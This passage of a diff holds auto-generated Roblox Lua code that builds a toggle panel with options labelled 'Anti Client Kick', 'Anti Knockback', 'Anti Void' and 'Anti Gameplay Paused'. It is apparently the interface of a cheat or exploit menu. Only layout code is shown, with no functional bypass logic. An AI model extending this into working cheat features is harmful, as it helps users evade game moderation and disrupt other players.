-G2L["13a"]["LayoutOrder"] = 2;
-G2L["13a"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button
-G2L["13b"] = Instance.new("TextButton", G2L["13a"]);
-G2L["13b"]["BorderSizePixel"] = 0;
-G2L["13b"]["TextTransparency"] = 1;
-G2L["13b"]["TextSize"] = 14;
-G2L["13b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["13b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["13b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["13b"]["ZIndex"] = 50;
-G2L["13b"]["BackgroundTransparency"] = 1;
-G2L["13b"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["13b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["13b"]["Name"] = [[button]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.UIPadding
-G2L["13c"] = Instance.new("UIPadding", G2L["13b"]);
-G2L["13c"]["PaddingTop"] = UDim.new(0, 3);
-G2L["13c"]["PaddingRight"] = UDim.new(0, 3);
-G2L["13c"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["13c"]["PaddingBottom"] = UDim.new(0, 3);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame
-G2L["13d"] = Instance.new("Frame", G2L["13b"]);
-G2L["13d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["13d"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["13d"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["13d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["13d"]["Name"] = [[toggleFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.outlineStroke
-G2L["13e"] = Instance.new("UIStroke", G2L["13d"]);
-G2L["13e"]["Thickness"] = 2;
-G2L["13e"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.toggleFade
-G2L["13f"] = Instance.new("CanvasGroup", G2L["13d"]);
-G2L["13f"]["BorderSizePixel"] = 0;
-G2L["13f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["13f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["13f"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["13f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["13f"]["Name"] = [[toggleFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.toggleFade.UIGradient
-G2L["140"] = Instance.new("UIGradient", G2L["13f"]);
-G2L["140"]["Rotation"] = 90;
-G2L["140"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text
-G2L["141"] = Instance.new("TextLabel", G2L["13a"]);
-G2L["141"]["TextWrapped"] = true;
-G2L["141"]["ZIndex"] = 10;
-G2L["141"]["BorderSizePixel"] = 0;
-G2L["141"]["TextSize"] = 14;
-G2L["141"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["141"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["141"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["141"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["141"]["BackgroundTransparency"] = 1;
-G2L["141"]["Size"] = UDim2.new(0, 155, 0, 20);
-G2L["141"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["141"]["Text"] = [[Anti Client Kick]];
-G2L["141"]["Name"] = [[text]];
-G2L["141"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text.UIPadding
-G2L["142"] = Instance.new("UIPadding", G2L["141"]);
-G2L["142"]["PaddingLeft"] = UDim.new(0, 5);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text.text
-G2L["143"] = Instance.new("UIStroke", G2L["141"]);
-G2L["143"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.UIPadding
-G2L["144"] = Instance.new("UIPadding", G2L["13a"]);
-G2L["144"]["PaddingLeft"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback
-G2L["145"] = Instance.new("Frame", G2L["f4"]);
-G2L["145"]["BorderSizePixel"] = 0;
-G2L["145"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["145"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["145"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["145"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["145"]["Name"] = [[knockback]];
-G2L["145"]["LayoutOrder"] = 4;
-G2L["145"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button
-G2L["146"] = Instance.new("TextButton", G2L["145"]);
-G2L["146"]["BorderSizePixel"] = 0;
-G2L["146"]["TextTransparency"] = 1;
-G2L["146"]["TextSize"] = 14;
-G2L["146"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["146"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["146"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["146"]["ZIndex"] = 50;
-G2L["146"]["BackgroundTransparency"] = 1;
-G2L["146"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["146"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["146"]["Name"] = [[button]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.UIPadding
-G2L["147"] = Instance.new("UIPadding", G2L["146"]);
-G2L["147"]["PaddingTop"] = UDim.new(0, 3);
-G2L["147"]["PaddingRight"] = UDim.new(0, 3);
-G2L["147"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["147"]["PaddingBottom"] = UDim.new(0, 3);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame
-G2L["148"] = Instance.new("Frame", G2L["146"]);
-G2L["148"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["148"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["148"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["148"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["148"]["Name"] = [[toggleFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.outlineStroke
-G2L["149"] = Instance.new("UIStroke", G2L["148"]);
-G2L["149"]["Thickness"] = 2;
-G2L["149"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.toggleFade
-G2L["14a"] = Instance.new("CanvasGroup", G2L["148"]);
-G2L["14a"]["BorderSizePixel"] = 0;
-G2L["14a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["14a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["14a"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["14a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["14a"]["Name"] = [[toggleFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.toggleFade.UIGradient
-G2L["14b"] = Instance.new("UIGradient", G2L["14a"]);
-G2L["14b"]["Rotation"] = 90;
-G2L["14b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text
-G2L["14c"] = Instance.new("TextLabel", G2L["145"]);
-G2L["14c"]["TextWrapped"] = true;
-G2L["14c"]["ZIndex"] = 10;
-G2L["14c"]["BorderSizePixel"] = 0;
-G2L["14c"]["TextSize"] = 14;
-G2L["14c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["14c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["14c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["14c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["14c"]["BackgroundTransparency"] = 1;
-G2L["14c"]["Size"] = UDim2.new(0, 155, 0, 20);
-G2L["14c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["14c"]["Text"] = [[Anti Knockback]];
-G2L["14c"]["Name"] = [[text]];
-G2L["14c"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text.UIPadding
-G2L["14d"] = Instance.new("UIPadding", G2L["14c"]);
-G2L["14d"]["PaddingLeft"] = UDim.new(0, 5);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text.text
-G2L["14e"] = Instance.new("UIStroke", G2L["14c"]);
-G2L["14e"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.UIPadding
-G2L["14f"] = Instance.new("UIPadding", G2L["145"]);
-G2L["14f"]["PaddingLeft"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======
-G2L["150"] = Instance.new("Frame", G2L["f4"]);
-G2L["150"]["BorderSizePixel"] = 0;
-G2L["150"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["150"]["Size"] = UDim2.new(1, 0, 0, 15);
-G2L["150"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["150"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["150"]["Name"] = [[======TITLE======]];
-G2L["150"]["LayoutOrder"] = 1;
-G2L["150"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text
-G2L["151"] = Instance.new("TextLabel", G2L["150"]);
+G2L["151"] = Instance.new("TextLabel", G2L["14a"]);
 G2L["151"]["TextWrapped"] = true;
+G2L["151"]["ZIndex"] = 10;
 G2L["151"]["BorderSizePixel"] = 0;
 G2L["151"]["TextSize"] = 14;
 G2L["151"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["151"]["TextTransparency"] = 0.3;
 G2L["151"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["151"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["151"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["151"]["BackgroundTransparency"] = 1;
-G2L["151"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["151"]["Size"] = UDim2.new(0, 155, 0, 20);
 G2L["151"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["151"]["Text"] = [[Anti]];
+G2L["151"]["Text"] = [[Anti Void]];
 G2L["151"]["Name"] = [[text]];
-G2L["151"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
+G2L["151"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text.UIPadding
+G2L["152"] = Instance.new("UIPadding", G2L["151"]);
+G2L["152"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text.text
+G2L["153"] = Instance.new("UIStroke", G2L["151"]);
+G2L["153"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.UIPadding
+G2L["154"] = Instance.new("UIPadding", G2L["14a"]);
+G2L["154"]["PaddingLeft"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused
+G2L["155"] = Instance.new("Frame", G2L["122"]);
+G2L["155"]["BorderSizePixel"] = 0;
+G2L["155"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["155"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["155"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["155"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["155"]["Name"] = [[gameplaypaused]];
+G2L["155"]["LayoutOrder"] = 2;
+G2L["155"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button
+G2L["156"] = Instance.new("TextButton", G2L["155"]);
+G2L["156"]["BorderSizePixel"] = 0;
+G2L["156"]["TextTransparency"] = 1;
+G2L["156"]["TextSize"] = 14;
+G2L["156"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["156"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["156"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["156"]["ZIndex"] = 50;
+G2L["156"]["BackgroundTransparency"] = 1;
+G2L["156"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["156"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["156"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.UIPadding
+G2L["157"] = Instance.new("UIPadding", G2L["156"]);
+G2L["157"]["PaddingTop"] = UDim.new(0, 3);
+G2L["157"]["PaddingRight"] = UDim.new(0, 3);
+G2L["157"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["157"]["PaddingBottom"] = UDim.new(0, 3);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame
+G2L["158"] = Instance.new("Frame", G2L["156"]);
+G2L["158"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["158"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["158"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["158"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["158"]["Name"] = [[toggleFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.outlineStroke
+G2L["159"] = Instance.new("UIStroke", G2L["158"]);
+G2L["159"]["Thickness"] = 2;
+G2L["159"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.toggleFade
+G2L["15a"] = Instance.new("CanvasGroup", G2L["158"]);
+G2L["15a"]["BorderSizePixel"] = 0;
+G2L["15a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["15a"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["15a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["15a"]["Name"] = [[toggleFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.toggleFade.UIGradient
+G2L["15b"] = Instance.new("UIGradient", G2L["15a"]);
+G2L["15b"]["Rotation"] = 90;
+G2L["15b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text
+G2L["15c"] = Instance.new("TextLabel", G2L["155"]);
+G2L["15c"]["TextWrapped"] = true;
+G2L["15c"]["ZIndex"] = 10;
+G2L["15c"]["BorderSizePixel"] = 0;
+G2L["15c"]["TextSize"] = 14;
+G2L["15c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["15c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["15c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15c"]["BackgroundTransparency"] = 1;
+G2L["15c"]["Size"] = UDim2.new(0, 155, 0, 20);
+G2L["15c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["15c"]["Text"] = [[Anti Gameplay Paused]];
+G2L["15c"]["Name"] = [[text]];
+G2L["15c"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text.UIPadding
+G2L["15d"] = Instance.new("UIPadding", G2L["15c"]);
+G2L["15d"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text.text
+G2L["15e"] = Instance.new("UIStroke", G2L["15c"]);
+G2L["15e"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.UIPadding
+G2L["15f"] = Instance.new("UIPadding", G2L["155"]);
+G2L["15f"]["PaddingLeft"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---
+G2L["160"] = Instance.new("Frame", G2L["122"]);
+G2L["160"]["BorderSizePixel"] = 0;
+G2L["160"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["160"]["Size"] = UDim2.new(1, 0, 0, 10);
+G2L["160"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["160"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["160"]["Name"] = [[---DIVIDER---]];
+G2L["160"]["LayoutOrder"] = 3;
+G2L["160"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame
+G2L["161"] = Instance.new("Frame", G2L["160"]);
+G2L["161"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["161"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["161"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["161"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["161"]["Name"] = [[dividerFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
+G2L["162"] = Instance.new("UIStroke", G2L["161"]);
+G2L["162"]["Thickness"] = 2;
+G2L["162"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
+G2L["163"] = Instance.new("CanvasGroup", G2L["161"]);
+G2L["163"]["BorderSizePixel"] = 0;
+G2L["163"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["163"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["163"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["163"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["163"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
+G2L["164"] = Instance.new("UIGradient", G2L["163"]);
+G2L["164"]["Rotation"] = 90;
+G2L["164"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
+G2L["165"] = Instance.new("UIStroke", G2L["161"]);
+G2L["165"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["165"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
+G2L["166"] = Instance.new("UICorner", G2L["161"]);
+
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.UIPadding
+G2L["167"] = Instance.new("UIPadding", G2L["160"]);
+G2L["167"]["PaddingTop"] = UDim.new(0, 3);
+G2L["167"]["PaddingRight"] = UDim.new(0, 8);
+G2L["167"]["PaddingLeft"] = UDim.new(0, 8);
+G2L["167"]["PaddingBottom"] = UDim.new(0, 3);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick
+G2L["168"] = Instance.new("Frame", G2L["122"]);
+G2L["168"]["BorderSizePixel"] = 0;
+G2L["168"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["168"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["168"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["168"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["168"]["Name"] = [[kick]];
+G2L["168"]["LayoutOrder"] = 2;
+G2L["168"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button
+G2L["169"] = Instance.new("TextButton", G2L["168"]);
+G2L["169"]["BorderSizePixel"] = 0;
+G2L["169"]["TextTransparency"] = 1;
+G2L["169"]["TextSize"] = 14;
+G2L["169"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["169"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["169"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["169"]["ZIndex"] = 50;
+G2L["169"]["BackgroundTransparency"] = 1;
+G2L["169"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["169"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["169"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.UIPadding
+G2L["16a"] = Instance.new("UIPadding", G2L["169"]);
+G2L["16a"]["PaddingTop"] = UDim.new(0, 3);
+G2L["16a"]["PaddingRight"] = UDim.new(0, 3);
+G2L["16a"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["16a"]["PaddingBottom"] = UDim.new(0, 3);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame
+G2L["16b"] = Instance.new("Frame", G2L["169"]);
+G2L["16b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["16b"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["16b"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["16b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["16b"]["Name"] = [[toggleFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.outlineStroke
+G2L["16c"] = Instance.new("UIStroke", G2L["16b"]);
+G2L["16c"]["Thickness"] = 2;
+G2L["16c"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.toggleFade
+G2L["16d"] = Instance.new("CanvasGroup", G2L["16b"]);
+G2L["16d"]["BorderSizePixel"] = 0;
+G2L["16d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16d"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["16d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16d"]["Name"] = [[toggleFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.toggleFade.UIGradient
+G2L["16e"] = Instance.new("UIGradient", G2L["16d"]);
+G2L["16e"]["Rotation"] = 90;
+G2L["16e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text
+G2L["16f"] = Instance.new("TextLabel", G2L["168"]);
+G2L["16f"]["TextWrapped"] = true;
+G2L["16f"]["ZIndex"] = 10;
+G2L["16f"]["BorderSizePixel"] = 0;
+G2L["16f"]["TextSize"] = 14;
+G2L["16f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["16f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["16f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16f"]["BackgroundTransparency"] = 1;
+G2L["16f"]["Size"] = UDim2.new(0, 155, 0, 20);
+G2L["16f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16f"]["Text"] = [[Anti Client Kick]];
+G2L["16f"]["Name"] = [[text]];
+G2L["16f"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text.UIPadding
+G2L["170"] = Instance.new("UIPadding", G2L["16f"]);
+G2L["170"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text.text
+G2L["171"] = Instance.new("UIStroke", G2L["16f"]);
+G2L["171"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.UIPadding
+G2L["172"] = Instance.new("UIPadding", G2L["168"]);
+G2L["172"]["PaddingLeft"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback
+G2L["173"] = Instance.new("Frame", G2L["122"]);
+G2L["173"]["BorderSizePixel"] = 0;
+G2L["173"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["173"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["173"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["173"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["173"]["Name"] = [[knockback]];
+G2L["173"]["LayoutOrder"] = 4;
+G2L["173"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button
+G2L["174"] = Instance.new("TextButton", G2L["173"]);
+G2L["174"]["BorderSizePixel"] = 0;
+G2L["174"]["TextTransparency"] = 1;
+G2L["174"]["TextSize"] = 14;
+G2L["174"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["174"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["174"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["174"]["ZIndex"] = 50;
+G2L["174"]["BackgroundTransparency"] = 1;
+G2L["174"]["Size"] = UDim2.new(0, 20, 0, 20);
